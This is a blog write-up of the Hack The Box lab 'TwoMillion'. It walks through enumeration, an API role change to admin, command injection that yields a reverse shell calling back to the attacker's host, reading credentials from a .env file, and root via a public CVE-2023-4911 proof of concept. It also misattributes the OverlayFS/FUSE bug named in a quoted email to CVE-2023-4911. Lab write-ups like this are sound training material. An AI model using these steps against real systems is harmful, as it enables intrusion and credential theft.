---
title: HTB TwoMillion - Writeup
date: 2025-07-15 13:53:00 +0330
categories: [Writeup]
tags: [api,cve]
description: My writeup of TwoMillion from Hack The Box 

---

![infocard](assets/img/TwoMillion.png)

## - **Introduction**
The initial process to get a foothold was to first find an invite code so that we can sign up, then we used an API endpoint to change our role to Administrator. After that, we find out that there is a Command Injection vulnerability in one of the admin endpoints and so we got a reverse shell from the box.

## - **Recon & Enum**
##### Port Scanning
To start off our recon we will begin with an Nmap scan of the machine:
```shell
$ sudo nmap -sC -sV -oN 2mil_nmap --min-rate=1000 10.10.11.221
```
```
Nmap scan report for 10.10.11.221
Host is up (0.52s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

>I always perform a full scan with then `-p-` flag to make sure no port is left behind but I am not including that here as we only have two tcp ports open.
{: .prompt-info }

```shell
$ sudo echo "10.10.11.221\t2million.htb" >> /etc/hosts
```

>We need to add the 2million.htb hostname to `/etc/hosts`.
{: .prompt-tip }
---
##### Creating an Account and finding the vulnerability
After browsing the site for a bit, I found two interesting pages, `/login` and `/invite` but to actually sign up we needed an invite code.
So after analyzing the requests in burp, I noticed the api nodes.

![login](assets/img/twomillion_burp_login.png)
![verify](assets/img/twomillion_burp_verify.png)
so I tried brute forcing api endpoints using gobuster and I found `/api/v1/invite/generate`.
```shell
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://2million.htb/api/v1/invite -b 301
```
```
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://2million.htb/api/v1/invite -b 301
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://2million.htb/api/v1/invite
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   301
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/verify               (Status: 405) [Size: 0]
/generate             (Status: 405) [Size: 0]
Progress: 18806 / 1273833 (1.48%)
```
So I used burp to send a POST request and got a response with an invite code (base64 encoded).

![invitecode](assets/img/twomillion_burp_invite.png)

After creating an account and logging in, only a few pages were accessible. I got a little stuck at first but when I tried accessing `/api` again, it authorized and I got a view of every API endpoint.

![api](assets/img/twomillion_api_v1.png)

Here `/admin/setting/update` caught my eye , I started playing around with it in burp and changed my role to admin.


![update](assets/img/twomillion_burp_update.png)

## - **Foothold**
Now this is were I got stuck for quite some time, but eventually I got it.  
The `/api/v1/admin/vpn/generate` and `/api/v1/user/vpn/generate` endpoints interact with the OS, so I tried injecting commands.
Though I have to say at first I didn't see it because the responses were empty. To make sure, I set up a `netcat` listener and made a request back to myself.

![update](assets/img/twomillion_cmd.png)

```shell
$ nc -nvlp 9070
```
```
listening on [any] 9070 ...
connect to [10.10.16.42] from (UNKNOWN) [10.10.11.221] 52748
GET / HTTP/1.1
Host: 10.10.16.42:9070
User-Agent: curl/7.81.0
Accept: */*
```

And here comes the reverse shell...
```
connect to [10.10.16.42] from (UNKNOWN) [10.10.11.221] 42046
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@2million:~/html$ id    
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@2million:~/html$
```

## - **User**
Getting the user was just waaay too easy. Looking at the files in `html` folder, there is a `.env` file. What was inside you may ask, DATABASE CREDENTIALS!
```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=*****************
```

```
www-data@2million:~/html$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

And tada!

```
admin@2million:~$ cat user.txt
59f625d****************eebc95d5e
```

## - **Root**
Using linpeas and looking around myself I found an email which directly pointed to the vulnerability we'll use to escalate privileges.
```
admin@2million:~$ cat /var/mail/admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Googled a bit and found out the email is referring to `CVE-2023-4911` and I used this [POC](https://github.com/NishanthAnand21/CVE-2023-4911-PoC) to get root.
>You can use `python3 -m http.server` to send files to the victim machine.
{: .prompt-tip }

```
admin@2million:/tmp$ python3 genlib.py 
admin@2million:/tmp$ chmod +x titap
admin@2million:/tmp$ ./titap
# whoami
root
# id
uid=0(root) gid=1000(admin) groups=1000(admin)
```

And the flag

```
# cd /root
# cat root.txt 
5b5c6****************90556050597
```

DONE!

![update](assets/img/twomillion_congrats.png)

Thanks for reading!
